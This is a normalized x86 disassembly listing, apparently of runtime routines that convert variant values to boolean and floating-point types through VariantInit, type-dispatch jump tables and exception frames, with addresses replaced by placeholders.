fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410358
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410510
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4102ac
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410458
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e85c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4104c4
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_4102ac
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_4102ac
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410767 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40293c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410358
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410510
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410954
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410a0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412aac
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408624
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a12
lea eax [ ebp - 0x10 ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_404620
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ecf0
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ecf0
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410a1c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ecf0
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410a5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410ab0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f3bc
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410b0c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ab7
lea eax [ ebp - 0x11 ]
call sub_40f094
retn
sub_410ac0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410b0c
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410b26 ]
mov eax ebx
call sub_410954
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410954
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410b0c
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410a1c
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410a5c
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e85c
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410ac0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410a1c
mov [ esp ] al
mov eax ebx
call sub_410a1c
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410ce8 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410954
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410b0c
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410e54
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410f09
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412aac
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041c8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4098a4
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ecf0
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ecf0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f10
lea eax [ ebp - 0x1c ]
call sub_403f40
lea eax [ ebp - 0xc ]
call sub_404620
retn
sub_410f18
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ecf0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410f64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410fb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f3bc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411014
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410fc0
lea eax [ ebp - 0x18 ]
call sub_40f094
retn
sub_410fc8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411014
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411030 ]
mov eax ebx
call sub_410e54
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410e54
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411014
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410f18
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410f64
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e85c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410fc8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410f18
fstp [ esp ]
fwait
mov eax ebx
call sub_410f18
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41120d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410e54
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411014
fstp [ esp ]
fwait
jmp r-xdata
sub_411390
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4114f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411014
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4113b2 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e85c
sub_411520
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4115fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412aac
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041c8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b0d0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411603
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0xc ]
call sub_404620
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4041c8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4098c0
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ecf0
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ecf0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_41160c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ecf0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41166c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ecf0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4116b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41170d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f3bc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411768
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411714
lea eax [ ebp - 0x18 ]
call sub_40f094
retn
sub_41171c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411768
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411784 ]
mov eax ebx
call sub_411520
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41166c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411520
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41160c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411768
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41166c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4116b8
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e85c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41171c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41166c
fstp [ esp ]
fwait
mov eax ebx
call sub_41166c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41194f ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41166c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411520
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
